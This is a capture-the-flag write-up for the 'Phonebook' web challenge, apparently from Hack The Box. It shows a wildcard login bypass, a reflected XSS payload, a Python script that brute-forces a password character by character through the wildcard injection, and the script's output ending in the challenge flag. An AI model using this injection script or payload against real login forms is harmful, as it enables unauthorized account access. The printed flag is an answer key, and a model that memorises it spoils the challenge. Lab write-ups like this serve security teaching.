# Phonebook

# Table of Contents

- [Research](#research)
- [Reproduce](#reproduce)
- [Flag](#flag)

# Research

## Broswer

### Provided Login

The suggested login does not work
<img width="318" alt="image" src="https://user-images.githubusercontent.com/10171446/170301811-59ad3619-ba07-48e0-a03d-f9463bc4cb77.png">

### SQL Injection

  http://157.245.33.77:32214
  
In the login fields user/pass enter `*`

<img width="766" alt="image" src="https://user-images.githubusercontent.com/10171446/170300880-77bb980c-9e1f-4680-8288-6a4cce280214.png">

**No Rate Limiting** on Form!

### XSS

  http://157.245.33.77:32214/login?message=<img src='x' onerror='alert(1)'>
  
Returns success

## Python Bruteforce Script

Original [script](https://sys41x4.github.io/HTB/challenge/web/Phonebook.html)

    import requests
    import time

    url = "http://157.245.33.77:32214/login"

    user_name, passwd =  "", ""

    #data = {"username":user_name, "password":passwd} # For testing purpose

    #num_characters = (48 - 57)
    #alphabet_chr = (65-90)/(97-122)
    #special_characters = (32–47 / 58–64 / 91–96 / 123–126)

    char = ''

    chr_num_dict= {97:122, 65:90, 48:57, 32:47, 58:64, 91:96, 123:126}

    for start in chr_num_dict.keys():
        for j in range(start, chr_num_dict[start]+1):
            char+=chr(j)

    char=char.replace("*", '')


    def chr_selector(track):

        return char[track]


    def cred_finder(cred_to_find):

        global user_name
        global passwd



        test_user = ''
        track = 0


        if cred_to_find == "user_name":

            pass_character = ''
            validate_usr = ''
            validate_pass = "*"

            try:
                if passwd[-1] != "*":

                    passwd += "*"

            except:
                pass


        elif cred_to_find == "passwd":

            usr_character = ''
            validate_usr = "*"
            validate_pass = ''

            try:
                if user_name[-1] != "*":
                    user_name += "*"
            except:
                pass

        else:

            exit()



        while True:

            try:
                if cred_to_find == "user_name":

                    usr_character = chr_selector(track)

                elif cred_to_find == "passwd":

                    pass_character = chr_selector(track)


                r_ = requests.post(url, data={"username":user_name+usr_character+"*", "password":passwd+pass_character+"*"})


                if  (r_.status_code == 200) and ("No search results." in r_.text):

                    user_name+=usr_character
                    passwd+=pass_character

                    r = requests.post(url, data={"username":user_name+validate_usr, "password":passwd+validate_pass})

                    track=0

                    print(f"Partially valid --> USERNAME : {user_name.replace('*', '')} | PASSWORD : {passwd.replace('*', '')}")

                    if (r.status_code == 200) and ("No search results." in r.text):
                        print(f"valid --> USERNAME : {user_name} | PASSWORD : {passwd}")

                        break


                    else:
                        track+=1

                else:
                    #print(f"Invalid --> USERNAME : {user_name+usr_character} | PASSWORD : {passwd+pass_character}") # For testing purpose
                    track+=1

            except KeyboardInterrupt:
                exit()

            except:

                # If the host is not available due to excessive brutefore attack
                # then it will wait some time to send another request
                wait=5
                time.sleep(wait)
                print(f"\nCouldn\'t able to reach {url}   |  Waiting for {wait} seconds\n")


    print("Starting Attack\n")

    #cred_finder('user_name') # Find the Username
    cred_finder('passwd') # Find the Passwd

### Script output

    ┌──(kali㉿kali)-[~]
    └─$ python3 phonebook-script.py
    Starting Attack

    Partially valid --> USERNAME :  | PASSWORD : H
    Partially valid --> USERNAME :  | PASSWORD : HT
    Partially valid --> USERNAME :  | PASSWORD : HTB
    Partially valid --> USERNAME :  | PASSWORD : HTB{
    Partially valid --> USERNAME :  | PASSWORD : HTB{d
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1r
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1re
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rec
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rect
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1recto
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rector
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4x
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_i
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k0
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k00
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k00l
    Partially valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k00l}
    valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k00l}


# Reproduce

    ┌──(kali㉿kali)-[~]
    └─$ python3 phonebook-script.py
    ...
    valid --> USERNAME :  | PASSWORD : HTB{d1rectory_h4xx0r_is_k00l}

# Flag

HTB{d1rectory_h4xx0r_is_k00l}
